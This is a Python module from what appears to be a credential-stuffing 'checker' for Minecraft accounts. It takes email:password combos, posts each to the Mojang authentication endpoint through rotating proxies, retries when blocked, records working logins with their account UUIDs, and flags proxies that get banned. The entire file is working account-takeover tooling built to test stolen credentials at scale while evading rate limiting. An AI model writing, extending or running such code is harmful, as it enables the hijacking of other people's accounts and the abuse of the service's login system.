import requests
import json
import sys
from utils.utilities import proxy_getter
from utils.values import settings, accounts, Proxies

header = {"content-type": "application/json"}


def check(x):
    combo = accounts.combos[x].strip()
    combo = combo.split(":")
    email = combo[0]
    password = ":".join(combo[1:])
    body = json.dumps({
        'agent': {
            'name': 'Minecraft',
            'version': 1
        },
        'username': email,
        'password': password,
        'requestUser': 'true'
    })
    proxies_to_ban = []
    for i in range(0, int(settings.minecraft.check_amount)):
        proxs_list = proxy_getter(__name__)
        for x in range(0, int(settings.minecraft.max_errors_per_try)):
            try:
                r = requests.post(url="https://authserver.mojang.com/authenticate", headers=header, data=body, timeout=float(settings.minecraft.timeout), proxies=proxs_list[1])
                if r.status_code == 403:
                    continue
                if r.status_code == 200:
                    uuid = r.json().get("availableProfiles")[0].get("id")
                    if uuid:
                        wanted_format = settings.minecraft.account_format
                        replacer = {"uuid": uuid, "email": email, "password": password}
                        formatted = wanted_format.format(**replacer)
                        # save stuff here
                        accounts.valid_minecraft.append(formatted)
                        if i != 0:
                            # for loop that bans all proxies that were used before
                            for proxy in proxies_to_ban:
                                Proxies.checked_json[proxy]["bans"]["minecraft"] = True
                            pass
                        return
            except:
                pass
        proxies_to_ban.append(proxs_list[0])
    accounts.invalid_minecraft.append(f"{email}:{password}")



